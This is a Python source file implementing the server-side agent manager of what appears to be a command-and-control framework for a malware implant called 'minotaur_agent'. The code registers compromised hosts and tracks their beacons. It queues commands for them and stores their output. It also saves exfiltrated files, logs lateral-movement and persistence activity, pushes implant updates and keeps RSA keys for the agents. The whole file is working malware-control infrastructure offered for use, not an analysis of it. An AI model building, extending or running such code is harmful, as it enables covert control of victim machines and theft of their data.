import sqlite3
import json
import uuid
from datetime import datetime
import os
from handlers.activity_logger import ActivityLogger

DB_PATH = os.path.join(os.path.dirname(__file__), '../../database/c2.db')
activity_logger = ActivityLogger()

class AgentManager:
    def __init__(self, socketio=None):
        self.socketio = socketio
        self._init_db()

    def _init_db(self):
        os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            os TEXT,
            ip TEXT,
            arch TEXT,
            version TEXT,
            platform TEXT,
            first_seen TEXT,
            last_beacon TEXT,
            status TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_commands (
            id TEXT PRIMARY KEY,
            agent_id TEXT,
            type TEXT,
            payload TEXT,
            status TEXT,
            created_at TEXT,
            sent_at TEXT,
            completed_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id TEXT,
            agent_id TEXT,
            output TEXT,
            error TEXT,
            received_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_exfil (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            file_path TEXT,
            file_data TEXT,
            received_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_lateral (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            target TEXT,
            command TEXT,
            output TEXT,
            success INTEGER,
            executed_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_persistence (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            method TEXT,
            status TEXT,
            details TEXT,
            reported_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS agent_rsa_keys (
            version TEXT NOT NULL,
            platform TEXT NOT NULL,
            private_key TEXT NOT NULL,
            public_key TEXT NOT NULL,
            created_at TEXT NOT NULL,
            PRIMARY KEY (version, platform)
        )''')
        conn.commit()
        conn.close()

    def register_agent(self, hostname, os_type, ip, arch, version, platform):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''SELECT id, first_seen FROM agents 
                     WHERE hostname=? AND ip=? AND os=? AND status='active'
                     ORDER BY last_beacon DESC LIMIT 1''',
                  (hostname, ip, os_type))
        row = c.fetchone()
        now = datetime.utcnow().isoformat()
        if row:
            agent_id = row[0]
            c.execute("UPDATE agents SET last_beacon=?, version=?, platform=? WHERE id=?",
                      (now, version, platform, agent_id))
            conn.commit()
            conn.close()
            if self.socketio:
                self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
            return agent_id
        else:
            agent_id = str(uuid.uuid4())
            c.execute('''INSERT INTO agents 
                         (id, hostname, os, ip, arch, version, platform, first_seen, last_beacon, status)
                         VALUES (?,?,?,?,?,?,?,?,?,?)''',
                      (agent_id, hostname, os_type, ip, arch, version, platform, now, now, 'active'))
            conn.commit()
            conn.close()
            if self.socketio:
                self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
            return agent_id

    def update_beacon(self, agent_id):
        now = datetime.utcnow().isoformat()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE agents SET last_beacon=? WHERE id=?", (now, agent_id))
        conn.commit()
        conn.close()

    def get_pending_commands(self, agent_id, agent_version=None, agent_platform=None):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, type, payload FROM agent_commands WHERE agent_id=? AND status='pending'", (agent_id,))
        rows = c.fetchall()
        commands = []
        for row in rows:
            commands.append({
                'id': row[0],
                'type': row[1],
                'payload': json.loads(row[2])
            })
        c.execute("UPDATE agent_commands SET status='sent', sent_at=? WHERE agent_id=? AND status='pending'",
                  (datetime.utcnow().isoformat(), agent_id))

        if agent_version and agent_platform:
            c.execute("SELECT version FROM agent_current_version WHERE platform=?", (agent_platform,))
            row = c.fetchone()
            if row and row[0] != agent_version:
                version_dir = agent_platform.replace('/', '_')
                filename = f"minotaur_agent_{agent_platform.replace('/', '_')}_{row[0]}{'.exe' if 'windows' in agent_platform else ''}"
                url = f"/static/agents/versions/{version_dir}/{filename}"
                update_cmd = {
                    'id': str(uuid.uuid4()),
                    'type': 'update',
                    'payload': {'version': row[0], 'url': url}
                }
                commands.insert(0, update_cmd)
        conn.commit()
        conn.close()
        return commands

    def add_command(self, agent_id, cmd_type, payload):
        cmd_id = str(uuid.uuid4())
        now = datetime.utcnow().isoformat()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO agent_commands 
                     (id, agent_id, type, payload, status, created_at)
                     VALUES (?,?,?,?,?,?)''',
                  (cmd_id, agent_id, cmd_type, json.dumps(payload), 'pending', now))
        conn.commit()
        conn.close()
        activity_logger.log_agent_command(agent_id, cmd_id, cmd_type, payload, now)
        return cmd_id

    def get_agent_id_for_command(self, command_id):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT agent_id FROM agent_commands WHERE id=?", (command_id,))
        row = c.fetchone()
        conn.close()
        return row[0] if row else None

    def save_result(self, command_id, agent_id, output, error):
        now = datetime.utcnow().isoformat()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO agent_results (command_id, agent_id, output, error, received_at)
                     VALUES (?,?,?,?,?)''',
                  (command_id, agent_id, output, error, now))
        c.execute("UPDATE agent_commands SET status='completed', completed_at=? WHERE id=?", (now, command_id))
        conn.commit()
        conn.close()
        activity_logger.log_agent_result(command_id, output, error, now)
        if self.socketio:
            self.socketio.emit('agent_result', {
                'agent_id': agent_id,
                'command_id': command_id,
                'output': output,
                'error': error
            })

    def save_exfil(self, agent_id, file_path, file_b64):
        now = datetime.utcnow().isoformat()
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO agent_exfil (agent_id, file_path, file_data, received_at)
                     VALUES (?,?,?,?)''',
                  (agent_id, file_path, file_b64, now))
        conn.commit()
        conn.close()
        if self.socketio:
            self.socketio.emit('exfil_received', {'agent_id': agent_id, 'file_path': file_path})

    def delete_agent(self, agent_id):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE agents SET status='deleted' WHERE id=?", (agent_id,))
        c.execute("DELETE FROM agent_commands WHERE agent_id=? AND status='pending'", (agent_id,))
        conn.commit()
        conn.close()
        if self.socketio:
            self.socketio.emit('agent_deleted', {'agent_id': agent_id})

    def clear_all_agents(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("DELETE FROM agents")
        c.execute("DELETE FROM agent_commands")
        c.execute("DELETE FROM agent_results")
        c.execute("DELETE FROM agent_exfil")
        c.execute("DELETE FROM agent_lateral")
        c.execute("DELETE FROM agent_persistence")
        conn.commit()
        conn.close()
        if self.socketio:
            self.socketio.emit('agents_cleared', {})

    def list_agents(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, hostname, os, ip, arch, version, platform, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
        rows = c.fetchall()
        agents = []
        for row in rows:
            agents.append({
                'id': row[0], 'hostname': row[1], 'os': row[2], 'ip': row[3],
                'arch': row[4], 'version': row[5], 'platform': row[6],
                'first_seen': row[7], 'last_beacon': row[8], 'status': row[9]
            })
        conn.close()
        return agents

    def store_rsa_keypair(self, version, platform, priv_pem, pub_pem):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        now = datetime.utcnow().isoformat()
        c.execute("INSERT OR REPLACE INTO agent_rsa_keys (version, platform, private_key, public_key, created_at) VALUES (?,?,?,?,?)",
                  (version, platform, priv_pem, pub_pem, now))
        conn.commit()
        conn.close()

    def get_rsa_private_key(self, version, platform):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT private_key FROM agent_rsa_keys WHERE version=? AND platform=?", (version, platform))
        row = c.fetchone()
        conn.close()
        return row[0] if row else None

    def get_rsa_public_key(self, version, platform):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT public_key FROM agent_rsa_keys WHERE version=? AND platform=?", (version, platform))
        row = c.fetchone()
        conn.close()
        return row[0] if row else None